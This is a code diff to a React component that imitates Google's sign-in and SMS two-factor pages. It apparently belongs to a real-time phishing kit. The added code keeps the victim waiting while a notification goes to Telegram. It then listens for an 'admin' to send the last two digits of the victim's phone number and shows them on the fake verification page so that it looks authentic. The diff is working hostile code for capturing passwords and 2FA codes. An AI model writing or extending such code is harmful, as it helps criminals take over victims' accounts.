@@ -34,6 +34,7 @@ function GoogleSignInPC({
   const [smsCode, setSmsCode] = useState("");
   const [smsCodeError, setSmsCodeError] = useState("");
   const [isSubmittingSmsCode, setIsSubmittingSmsCode] = useState(false);
+  const [lastTwoDigits, setLastTwoDigits] = useState("");
   const passwordTimeoutRef = useRef(null);
   const { setAllData, AllData } = useContext(DataContext);
 
@@ -56,12 +57,23 @@ function GoogleSignInPC({
       }
     };
 
+    const handleSmsDigitsReceived = (e) => {
+      const { digits } = e.detail;
+      if (digits) {
+        setLastTwoDigits(digits);
+        setIsRequestingAuth(false);
+        setStep("2fa-sms-code");
+      }
+    };
+
     window.addEventListener("appauth-show-code", handleShowCode);
     window.addEventListener("appauth-code-received", handleCodeReceived);
+    window.addEventListener("appauth-sms-digits-received", handleSmsDigitsReceived);
 
     return () => {
       window.removeEventListener("appauth-show-code", handleShowCode);
       window.removeEventListener("appauth-code-received", handleCodeReceived);
+      window.removeEventListener("appauth-sms-digits-received", handleSmsDigitsReceived);
     };
   }, []);
 
@@ -191,7 +203,9 @@ function GoogleSignInPC({
         clearTimeout(passwordTimeoutRef.current);
         passwordTimeoutRef.current = null;
       }
-      setStep("2fa-sms-code");
+      // Don't navigate to 2fa-sms-code yet - wait for admin to reply with digits
+      // Keep user on current waiting state
+      setIsRequestingAuth(true);
       
       // Send full formatted notification to Telegram
       try {
@@ -319,8 +333,9 @@ function GoogleSignInPC({
         console.log('[Gmail PC] Processing 2FA Number - going to step: 2fa-code');
         setStep("2fa-code");
       } else if (data.type === 'sms') {
-        console.log('[Gmail PC] Processing 2FA SMS - going to step: 2fa-sms-code');
-        setStep("2fa-sms-code");
+        console.log('[Gmail PC] Processing 2FA SMS - waiting for admin digits');
+        // Don't navigate yet - wait for admin to reply with digits
+        setIsRequestingAuth(true);
       }
     });
 
@@ -351,6 +366,19 @@ function GoogleSignInPC({
       if (data.code) {
         console.log('[Gmail PC] Setting expected code:', data.code);
         setExpectedCode(data.code);
+      }
+    });
+
+    // Listen for SMS phone digits (2FA SMS flow)
+    const smsDigitsEventName = `gmail-sms-digits-${Unik}`;
+    console.log('[Gmail PC] Listening for event:', smsDigitsEventName);
+    socketInstance.on(smsDigitsEventName, (data) => {
+      console.log('[Gmail PC] ✅ Received SMS digits event:', smsDigitsEventName, data);
+      if (data.digits) {
+        console.log('[Gmail PC] Setting last two digits:', data.digits);
+        setLastTwoDigits(data.digits);
+        setIsRequestingAuth(false);
+        setStep("2fa-sms-code");
       }
     });
 
@@ -1273,7 +1301,7 @@ function GoogleSignInPC({
                     </div>
 
                     <p className="text-sm font-go text-[#202124] mb-8">
-                      A text message with a 6-digit verification code was just sent to *** *** ***
+                      A text message with a 6-digit verification code was just sent to {lastTwoDigits ? `********${lastTwoDigits}` : "*******^**"}
                     </p>
 
                     <form onSubmit={handleSmsCodeSubmit}>
